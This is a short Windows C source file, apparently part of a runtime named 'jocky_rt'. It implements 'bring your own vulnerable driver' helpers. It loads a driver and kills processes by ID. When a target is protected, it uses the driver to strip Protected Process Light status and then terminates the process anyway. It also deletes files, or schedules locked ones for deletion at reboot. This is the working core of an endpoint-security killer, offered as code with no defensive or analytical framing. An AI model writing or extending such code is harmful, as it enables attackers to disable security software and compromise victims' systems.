#ifdef _WIN32

#include "../../include/jocky_rt.h"
#include <windows.h>
#include <stdint.h>
#include <string.h>
#include <wchar.h>

static jocky_byovd_t g_btr_ctx;
static int g_btr_loaded = 0;

int32_t btr_load_driver(void) {
    if (g_btr_loaded) return 0;
    if (!jocky_byovd_load(NULL, NULL, &g_btr_ctx)) return -1;
    g_btr_loaded = 1;
    return 0;
}

int32_t btr_kill_process(int32_t process_id) {
    if (process_id <= 0) return -1;
    uint32_t pid = (uint32_t)process_id;

    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (h && h != INVALID_HANDLE_VALUE) {
        BOOL ok = TerminateProcess(h, 1);
        CloseHandle(h);
        if (ok) return 0;
    }

    /* Protected process: strip PPL via driver then retry */
    if (g_btr_loaded) {
        jocky_strip_ppl(&g_btr_ctx, pid);
        h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (h && h != INVALID_HANDLE_VALUE) {
            BOOL ok = TerminateProcess(h, 1);
            CloseHandle(h);
            return ok ? 0 : -1;
        }
    }
    return -1;
}

int32_t btr_delete_file(const char* filename) {
    if (!filename) return -1;

    if (DeleteFileA(filename)) return 0;

    /* Locked file: schedule deletion on next reboot */
    if (MoveFileExA(filename, NULL, MOVEFILE_DELAY_UNTIL_REBOOT)) return 0;

    return -1;
}

int32_t byovd_unload_driver(int32_t handle) {
    if (!g_btr_loaded) return -1;
    jocky_byovd_unload(&g_btr_ctx);
    g_btr_loaded = 0;
    return 0;
}

int32_t byovd_get_os_version(void) {
    DWORD version = GetVersion();
    int major = (int)(LOBYTE(LOWORD(version)));
    int minor = (int)(HIBYTE(LOWORD(version)));
    return major * 100 + minor;
}

#endif /* _WIN32 */
